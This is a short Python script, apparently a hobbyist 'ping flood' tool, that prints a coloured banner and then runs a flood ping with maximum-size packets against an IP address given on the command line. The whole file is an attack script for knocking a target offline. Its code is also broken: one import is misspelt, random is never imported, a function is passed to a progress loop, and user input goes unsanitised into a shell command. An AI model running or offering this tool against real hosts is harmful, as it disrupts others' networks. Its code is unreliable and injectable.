import os, sys, art, time
from tdqm import trange
from colorama import Fore

def in_sudo_mode():
    if not 'SUDO_UID' in os.environ.keys():
        print("Try running this program with sudo.")
        sys.exit()

def load():
    # loading screen
    time.sleep(0.5)
        
def main():
    # ui
    list = [Fore.BLUE,Fore.YELLOW,Fore.LIGHTCYAN_EX,Fore.CYAN,Fore.GREEN,Fore.MAGENTA,Fore.RED]
    rand = random.choice(list)
    banner = art.text2art("ping flood", font="small")
    print(f"{rand}{banner}")
    
    for i in trange(load):
        load()
    
    # variables
    ip = sys.argv[1]
    ps = sys.argv[2]
    
    # attack
    if ps == "0":
        os.system(f"ping -s 65507 -f {ip}")    
    else:
        os.system(f"ping -s {ps} -f {ip}")
        
main()
